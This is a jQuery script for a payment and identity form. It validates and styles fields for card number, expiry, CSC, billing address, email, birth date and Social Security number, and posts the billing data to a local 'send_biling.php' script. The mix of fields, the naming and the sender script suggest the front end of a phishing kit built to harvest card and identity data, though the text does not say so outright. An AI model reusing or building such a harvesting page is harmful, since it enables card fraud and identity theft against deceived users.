$("#cancel").click(function(){
	    	$("#billingo").addClass("no");
	    	$("#cartano").removeClass("no");
	    	$("#lbl5,#lbl7,#lbl8,#lbl9,#lbl10").removeClass("lbl-error");
	    	$("#input5,#input7,#input8,#input9,#input10").removeClass("inp-error");
	    	$("#Countrylbl").removeClass("opt-error");
	    	$("#Country").removeClass("select-error");
		});
		function handleSelect(elm)
		{
			$("#billingo").removeClass("no");
	    	$("#cartano").addClass("no");
	    	$("#again").attr("selected","");
		}


$(document).ready(function(){
	    	$("#input1").focus(function(){
	        	$("#lbl1").addClass("visited");
	        	$("#lbl1").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input1").blur(function(){
	        	$("#lbl1").removeClass("visited");
	        	$("#lbl1").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input2").focus(function(){
	        	$("#lbl2").addClass("visited");
	        	$("#lbl2").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input2").blur(function(){
	        	$("#lbl2").removeClass("visited");
	        	$("#lbl2").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input3").focus(function(){
	        	$("#lbl3").addClass("visited");
	        	$("#lbl3").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input3").blur(function(){
	        	$("#lbl3").removeClass("visited");
	        	$("#lbl3").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input4").focus(function(){
	        	$("#lbl4").addClass("visited");
	        	$("#lbl4").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input4").blur(function(){
	        	$("#lbl4").removeClass("visited");
	        	$("#lbl4").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input5").focus(function(){
	        	$("#lbl5").addClass("visited");
	        	$("#lbl5").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input5").blur(function(){
	        	$("#lbl5").removeClass("visited");
	        	$("#lbl5").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input6").focus(function(){
	        	$("#lbl6").addClass("visited");
	        	$("#lbl6").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input6").blur(function(){
	        	$("#lbl6").removeClass("visited");
	        	$("#lbl6").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input7").focus(function(){
	        	$("#lbl7").addClass("visited");
	        	$("#lbl7").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input7").blur(function(){
	        	$("#lbl7").removeClass("visited");
	        	$("#lbl7").addClass("checkedblur");

	    	});
		});
		$(document).ready(function(){
	    	$("#input8").focus(function(){
	        	$("#lbl8").addClass("visited");
	        	$("#lbl8").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input8").blur(function(){
	        	$("#lbl8").removeClass("visited");
	        	$("#lbl8").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input9").focus(function(){
	        	$("#lbl9").addClass("visited");
	        	$("#lbl9").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input9").blur(function(){
	        	$("#lbl9").removeClass("visited");
	        	$("#lbl9").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input10").focus(function(){
	        	$("#lbl10").addClass("visited");
	        	$("#lbl10").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input10").blur(function(){
	        	$("#lbl10").removeClass("visited");
	        	$("#lbl10").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#inputMailBox").focus(function(){
	        	$("#lblMailBox").addClass("visited");
	        	$("#lblMailBox").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#inputMailBox").blur(function(){
	        	$("#lblMailBox").removeClass("visited");
	        	$("#lblMailBox").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input11").focus(function(){
	        	$("#lbl11").addClass("visited");
	        	$("#lbl11").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input11").blur(function(){
	        	$("#lbl11").removeClass("visited");
	        	$("#lbl11").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input12").focus(function(){
	        	$("#lbl12").addClass("visited");
	        	$("#lbl12").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#input12").blur(function(){
	        	$("#lbl12").removeClass("visited");
	        	$("#lbl12").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#birthinput").focus(function(){
	        	$("#birthlbl").addClass("visited");
	        	$("#birthlbl").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#birthinput").blur(function(){
	        	$("#birthlbl").removeClass("visited");
	        	$("#birthlbl").addClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#ssninput").focus(function(){
	        	$("#ssnlbl").addClass("visited");
	        	$("#ssnlbl").removeClass("checkedblur");
	    	});
		});
		$(document).ready(function(){
	    	$("#ssninput").blur(function(){
	        	$("#ssnlbl").removeClass("visited");
	        	$("#ssnlbl").addClass("checkedblur");
	    	});
		});

$(document).ready(function(){

	$('#input1').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl1').removeClass('checked');$("#lbl1").removeClass("checkedblur"); } 
		else {$('#lbl1').addClass('checked');$("#lbl1").removeClass("lbl-error");$("#input1").removeClass("inp-error"); }});

	$('#input2').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl2').removeClass('checked'); } 
		else {$('#lbl2').addClass('checked');$("#lbl2").removeClass("lbl-error");$("#input2").removeClass("inp-error"); }});

	$('#input3').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl3').removeClass('checked'); } 
		else {$('#lbl3').addClass('checked');$("#lbl3").removeClass("lbl-error");$("#input3").removeClass("inp-error"); }});

	$('#input4').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl4').removeClass('checked'); } 
		else {$('#lbl4').addClass('checked');$("#lbl4").removeClass("lbl-error");$("#input4").removeClass("inp-error"); }});

	$('#input5').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl5').removeClass('checked'); } 
		else {$('#lbl5').addClass('checked');$("#lbl5").removeClass("lbl-error");$("#input5").removeClass("inp-error"); }});

	$('#input6').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl6').removeClass('checked'); } 
		else {$('#lbl6').addClass('checked');$("#lbl6").removeClass("lbl-error");$("#input6").removeClass("inp-error"); }});

	$('#input7').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl7').removeClass('checked'); } 
		else {$('#lbl7').addClass('checked');$("#lbl7").removeClass("lbl-error");$("#input7").removeClass("inp-error"); }});

	$('#input8').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl8').removeClass('checked'); } 
		else {$('#lbl8').addClass('checked');$("#lbl8").removeClass("lbl-error");$("#input8").removeClass("inp-error"); }});

	$('#input9').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl9').removeClass('checked'); } 
		else {$('#lbl9').addClass('checked');$("#lbl9").removeClass("lbl-error");$("#input9").removeClass("inp-error"); }});

	$('#input10').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lbl10').removeClass('checked'); } 
		else {$('#lbl10').addClass('checked');$("#lbl10").removeClass("lbl-error");$("#input10").removeClass("inp-error"); }});

	$('#inputMailBox').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#lblMailBox').removeClass('checked'); } 
		else {$('#lblMailBox').addClass('checked');$("#lblMailBox").removeClass("lbl-error");$("#inputMailBox").removeClass("inp-error"); }});

	$('#birthinput').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#birthlbl').removeClass('checked'); } 
		else {$('#birthlbl').addClass('checked');$("#birthlbl").removeClass("lbl-error");$("#birthinput").removeClass("inp-error"); }});

	$('#ssninput').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#ssnlbl').removeClass('checked'); } 
		else {$('#ssnlbl').addClass('checked');$("#ssnlbl").removeClass("lbl-error");$("#ssninput").removeClass("inp-error"); }});



	$('#input5'),$('#input7'),$('#input8'),$('#input9'),$('#input10').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#toggleAddress').removeClass('no');$('#Addresstoggled').addClass('no') } 
		else { $('#toggleAddress').addClass('no');$('#Addresstoggled').removeClass('no') }});
	});





	function sirahamada() {

		

		var a = document.getElementById("input5").value;
    	document.getElementById("7omti").innerHTML = a;
    	var b = document.getElementById("input9").value;
    	document.getElementById("zipi").innerHTML = b;
    	var c = document.getElementById("input7").value;
    	document.getElementById("mdinti").innerHTML = c;
    	var d = document.getElementById("Country").value;
    	document.getElementById("bladi").innerHTML = d;


    	var as = document.getElementById("input5").value;
    	var ad = document.getElementById("input6").value;
    	document.getElementById("myaddress").value = as + ad;
    	var ae = document.getElementById("input7").value;
    	document.getElementById("mycity").value = ae;
    	var af = document.getElementById("input8").value;
    	document.getElementById("mystate").value = af;
    	var ag = document.getElementById("input9").value;
    	document.getElementById("myzip").value = ag;
    	var ak = document.getElementById("input10").value;
    	document.getElementById("myphone").value = ak;
    	var al = document.getElementById("Country").value;
    	document.getElementById("mycountry").value = al;


		$("#kpop").removeClass("no");
		$("#checkbill").removeClass("no");
		$("#billingo").addClass("no");
		$("#cartano").removeClass("no");
		$("#switch-bill").addClass("no");
		$("#billing-saved").removeClass("no");
		


	$.post("./system/send_biling.php?ajax", $("#billingForm").serialize(), function(result) {



		setTimeout(function() {
	        $("#kpop").addClass("no");
	        $("#toggleCard").addClass("no");
	        $("#Cardtoggled").removeClass("no");
		}, 5000);


});
	}



	$(document).ready(function(){
	    $("#switch-bill").focus(function(){
	        $("#addaddress-lbl").removeClass("opt-error");
        	$("#switch-bill").removeClass("select-error");
	    });
	});
	$(document).ready(function(){
	    $("#Country").focus(function(){
	        $("#Countrylbl").removeClass("opt-error");
        	$("#Country").removeClass("select-error");
	    });
	});

	jQuery('body').on('keyup', '#input3', function(e){
	console.log($(this).val());

	var val = $(this).val();
	if(!isNaN(val)) {
	    if(val > 1 && val < 10 && val.length == 1) {
	        temp_val = "0" + val + " / ";
	        $(this).val(temp_val);
	    }
	    else if (val >= 1 && val < 10 && val.length == 2 && e.keyCode != 8) {
	        temp_val = val + " / ";
	        $(this).val(temp_val);			        	
	    }
	    else if(val > 9 && val.length == 2 && e.keyCode != 8) {
	        temp_val = val + " / ";
	        $(this).val(temp_val);
	    }
	}
	else {
	}
	});
function validateForm() {
    var a = document.forms["cartaForm"]["cardholder"].value;
    var b = document.forms["cartaForm"]["cardnumber"].value;
    var c = document.forms["cartaForm"]["dateexp"].value;
    var d = document.forms["cartaForm"]["csc"].value;
    var e = document.forms["cartaForm"]["addaddress"].value;
    if (a == "") {
        $("#lbl1").addClass("lbl-error");
        $("#input1").addClass("inp-error");
    }
    if (b == "") {
        $("#lbl2").addClass("lbl-error");
        $("#input2").addClass("inp-error");
    }
    if (c == "") {
        $("#lbl3").addClass("lbl-error");
        $("#input3").addClass("inp-error");
    }
    if (d == "") {
        $("#lbl4").addClass("lbl-error");
        $("#input4").addClass("inp-error");
    }
    if (e == "") {
        $("#addaddress-lbl").addClass("opt-error");
        $("#switch-bill").addClass("select-error");
    }
    if (a == ""){return false;}if (b == ""){return false;}if (c == ""){return false;}if (d == ""){return false;}if (e == ""){return false;}
}
function checkbillForm() {
    var f = document.forms["billingForm"]["addressline1"].value;
    var g = document.forms["billingForm"]["city"].value;
    var h = document.forms["billingForm"]["state"].value;
    var i = document.forms["billingForm"]["zip"].value;
    var j = document.forms["billingForm"]["phone"].value;
    var k = document.forms["billingForm"]["Country"].value;
    if (f == "") {
        $("#lbl5").addClass("lbl-error");
        $("#input5").addClass("inp-error");
    }
   	if (g == "") {
        $("#lbl7").addClass("lbl-error");
        $("#input7").addClass("inp-error");
    }
    if (h == "") {
        $("#lbl8").addClass("lbl-error");
        $("#input8").addClass("inp-error");
    }
    if (i == "") {
        $("#lbl9").addClass("lbl-error");
        $("#input9").addClass("inp-error");
    }
    if (j == "") {
        $("#lbl10").addClass("lbl-error");
        $("#input10").addClass("inp-error");
    }
    if (k == "") {
        $("#Countrylbl").addClass("opt-error");
        $("#Country").addClass("select-error");
    }
    if (f == ""){return false;}if (g == ""){return false;}if (h == ""){return false;}if (i == ""){return false;}if (j == ""){return false;}if (k == ""){return false;}
}
function validateMailBox() {
    var l = document.forms["mailBoxForm"]["inputMailBox"].value;
    if (l == "") {
        $("#lblMailBox").addClass("lbl-error");
        $("#inputMailBox").addClass("inp-error");
    }
    if (l == ""){return false;}
}
function validateSecure() {
    var m = document.forms["secureForm"]["birthinput"].value;
    var n = document.forms["secureForm"]["birthinput"].value;
    if (m == "") {
        $("#birthlbl").addClass("lbl-error");
        $("#birthinput").addClass("inp-error");
    }
    if (n == "") {
        $("#ssnlbl").addClass("lbl-error");
        $("#ssninput").addClass("inp-error");
    }
    if (m == ""){return false;}if (n == ""){return false;}
}






$('#input2').validateCreditCard(function(result) {
		if (result.card_type != null) {switch (result.card_type.name) {
			case "VISA":
						$('.cc-icon').css('background-position', '98.5% -1%');
						break;

			case "VISA ELECTRON":
						$('.cc-icon').css('background-position', '98.5%  47.4%');
						break;

			case "MASTERCARD":
						$('.cc-icon').css('background-position', '98.5%  5%');
						break;

			case "MAESTRO":
						$('.cc-icon').css('background-position', '98.5%  35%');
						break;

			case "DISCOVER":
						$('.cc-icon').css('background-position', '98.5%  16.7%');
						break;

			case "AMEX":
						$('.cc-icon').css('background-position', '98.5%  11%');
						$('.cvv').css('background-position', '0 94%');
						$("#input4").attr('maxlength','4');
						$("#lbl4").html("CSC (4 digits)");
						break;

			case "JCB":
						$('.cc-icon').css('background-position', '98.5% 28.8%');
						break;

			case "DINERS_CLUB":
						$('.cc-icon').css('background-position', '98.5% 23%');
						break;

			default:$('.cc-icon').css('background-position', '98.5% 82%');break;}} 

		else {$('.cc-icon').css('background-position', '0 82%');$('.cvv').css('background-position', '0 88%');$("#input4").attr('maxlength','3');$("#lbl4").html("CSC (3 digits)");}if (result.valid || $cardinput.val().length > 16) {if (result.valid) {$('#creditCard').removeClass('error').addClass('');} else {$('#creditCard').removeClass('').addClass('error');}} else {$('#creditCard').removeClass('').removeClass('error');}});

